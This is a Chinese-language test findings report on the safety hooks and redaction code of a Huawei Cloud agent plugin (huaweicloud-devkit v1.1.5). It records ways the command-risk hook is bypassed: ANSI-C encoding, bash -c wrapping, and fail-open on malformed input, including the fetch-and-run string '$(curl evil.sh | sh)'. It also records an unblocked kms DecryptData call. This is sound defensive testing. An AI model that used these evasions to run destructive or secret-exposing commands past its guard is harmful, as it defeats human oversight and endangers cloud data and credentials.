# FINDINGS — 缺陷发现清单（CodeArtsAgent-deepseek-v4-pro-0813）

> **落盘路径**：`results/CodeArtsAgent/2026-09-22-124.70.78.131/Linux/FINDINGS.md`
> **生成时间**：2026-09-22 05:30（北京时间）
> **被测对象**：huaweicloud-devkit npm latest v1.1.5（gitHead `e7ed6f66`）
> **本轮结论**：设计级 FAIL 15 + SPEC 1，展开级 FAIL 12（D10-3 同源）。多数为历史 issue 复现/延续（#673/#13/#726/#11/#650）；**本轮新增产品缺陷 4 条**（D4-3 kms DecryptData 未拦截 / D4-24 确认令牌无结构化返回 / D8-1 文档 39vs40 / D8-9 sanitizeValue 不脱敏）。
> **关键修复确认**：昨日「D4-2 凭证 env 打印拦截(HW_ 前缀)」「D9-2 unknown tool -32601」「D4-29 classifyRawCommand 未导出」「D9-8 inputSchema 版本」「D4-13 只读子账号写权限过宽」经今日 v1.1.5 复测均已修复/消除。这些不再列为缺陷。

---

## #1【P0】D4-15 hook ANSI-C 编码绕过

- **现象**：`$'hcloud E\x43S DeleteServers'` 判 allow（编码变体绕过写操作风险规则）。
- **断言**：编码变体不得绕过写操作风险规则，应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 纯正则文本匹配，未解析 ANSI-C 引号编码。
- **证据**：`evidence/D4-15/stdout.log`
- **状态**：历史 #673（复现）

## #2【P1】D4-16 命令包裹穿透

- **现象**：`bash -c "hcloud ecs DeleteServers --server-id 1"` 判 allow；shell 包裹内命令未穿透拦截。
- **断言**：shell 包裹内的写/敏感命令应穿透并 deny。
- **根因**：`cloud-risk-rules.json` env-dump 规则词边界 `(^|\s)(env|printenv)` 不匹配 shell 包裹内层。
- **证据**：`evidence/D4-16/stdout.log`
- **状态**：历史 #673（复现）

## #3【P1】D4-17 hook 畸形输入 fail-open

- **现象**：`evaluateCommandRisk("")`、`"   "`、`"$(curl evil.sh | sh)"` 均返回 allow；畸形制品 `{not-valid-json` 也 allow。
- **断言**：畸形/空输入应默认拒绝（fail-closed）。
- **根因**：`risk-rule-engine.mjs` 无 finding 即 allow，未实现 fail-closed 兜底。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：历史 #673（复现）

## #4【P0】D4-23 全局规则 huawei-agent-rules.mdc 未注入

- **现象**：`rules/huawei-agent-rules.mdc` 全仓无安装/加载代码引用（孤儿文件），11 安装目标未注入。
- **断言**：安装目标均应注入全局规则，无孤儿文件。
- **根因**：`rules/huawei-agent-rules.mdc` 无安装/加载代码引用。
- **证据**：`evidence/D4-23/stdout.log`
- **状态**：历史 #673（复现）

## #5【P1】D4-25 Python hook 写操作遥测分类失效

- **现象**：独立写动词前为空格时（`hcloud ecs DeleteServer`）遥测事件 key 判 `cli:invoke` 而非 `cli:write`；只读 `ListServers` 正确 `cli:read`。
- **断言**：只读→`cli:read`、写→`cli:write`、其他→`cli:invoke`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py` 写分类正则用 `(^|[A-Za-z0-9])` 而非 `\b` 单词边界。
- **证据**：`evidence/D4-25/stdout.log`
- **状态**：历史 #13（复现）

## #6【P1】D4-26 / D4-27 双路径脱敏缺裸 token 关键字

- **现象**：`redactSecrets('token=T0K3N')` 与 `redactOutput('token=T0K3N')` 对裸 `token=` 均不脱敏（明文残留）；findings.evidence 裸 token 也明文残留。
- **断言**：裸 `token=` 关键字后值应替换为 `<redacted>`。
- **根因**：`safety-policy.mjs` redactString 关键字列表与 `risk-rule-engine.mjs` redactEvidence 正则均未含裸 `token`。
- **证据**：`evidence/D4-26/stdout.log`、`evidence/D4-27/stdout.log`
- **状态**：历史 #726（复现）

## #7【P1】D10-3 / D3-S5 / D3-S6 / D3-S7 / EXP-E01~E14 serviceCatalog 中文意图路由 MISS

- **现象**：run-eval 15 条中文评测 HIT=3 MISS=11 N/A=1，准确率 21.4%（<90%）；D3-S5「部署网站+数据库+对象存储」仅命中 Sandbox|DevStation；D3-S6「部署定时函数任务」MISS；D3-S7「Web 应用+RDS」仅命中 RDS；EXP-E 多数返回 fallback "Run hcloud --help"。
- **断言**：中文/复合意图命中对应服务，准确率 ≥90%。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1786-1890` routeMap 仅 sandbox/voucher 含 CJK 关键词，其余 20+ 服务仅英文关键词。
- **证据**：`evidence/D10-3/stdout.log`、`evidence/EXP-E01/stdout.log`、`eval/results/eval-run-*.csv`
- **状态**：历史 #11（复现）

## #8【P0】D4-3 kms DecryptData 明文 secret API 未拦截

- **现象**：`hcloud csms ShowSecretVersion --secret-name x` 判 deny；但 `hcloud kms DecryptData --ciphertext x` 判 allow。
- **断言**：返回明文/二进制 secret 的 API 均应被拦截（deny）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:232` 仅匹配 blockedSecretOperations（ShowSecretVersion/DownloadSecret/GetSecretValue），kms DecryptData 未列入；`:432` 文本匹配也不含 DecryptData。
- **影响**：kms 解密返回的明文数据可进入 agent 上下文，敏感数据泄漏面。
- **证据**：`evidence/D4-3/stdout.log`
- **状态**：本轮新增（待提单）

## #9【P1】D4-24 确认令牌无结构化返回

- **现象**：`consumeApprovalToken` 过期/重复消费均返回 `null`，无 `{code:'CONFIRM_TOKEN_EXPIRED'}` 或 `{outcome:'already_processed'}` 字段。
- **断言**：过期令牌返回 `{code:'CONFIRM_TOKEN_EXPIRED'}`；重复确认返回 `{outcome:'already_processed'}`。
- **根因**：`plugins/huaweicloud-core/src/hcloud-cli.mjs:84-96` consumeApprovalToken 过期/重复均返回 null，未返回结构化 code/outcome。
- **证据**：`evidence/D4-24/stdout.log`
- **状态**：本轮新增（待提单）

## #10【P2】D8-1 文档与能力漂移（声明 39 tools，实现 40）

- **现象**：源码仓库 AGENTS.md 两处声明「39 tools」，实现 tools.mjs TOOL_DEFINITIONS=40。
- **断言**：文档声明的工具数应与实现一致。
- **根因**：`AGENTS.md:27` 与 `AGENTS.md:45` 硬编码 39，未随 tools.mjs 增至 40 同步。
- **证据**：`evidence/D8-1/stdout.log`
- **状态**：本轮新增（待提单）

## #11【P2】D8-9 sanitizeValue 不脱敏敏感值

- **现象**：`sanitizeValue('ak=AK123 sk=SKsecret x-admin-token=TTT')` 返回原样（仅空白清理+超长截断），AK/SK/token 明文残留。
- **断言**：sanitizeValue 应移除 AK/SK/token 等敏感值，不改变合法值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189` sanitizeValue 仅 replace 空白 + slice 截断，无敏感值脱敏逻辑。
- **影响**：遥测上报值未脱敏，敏感值可经遥测事件外泄。
- **证据**：`evidence/D8-9/stdout.log`
- **状态**：本轮新增（待提单）

## #12【P1】D9-9 tools/call 超时/取消语义未声明（SPEC）

- **现象**：initialize capabilities 仅 `{tools:{}}`，未声明 `notifications.cancellation`。
- **断言**：tools/call 应声明取消语义（capabilities.notifications.cancellation）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` capabilities 未声明 cancellation。
- **证据**：`evidence/D9-9/stdout.log`
- **状态**：SPEC-MISMATCH（延续）
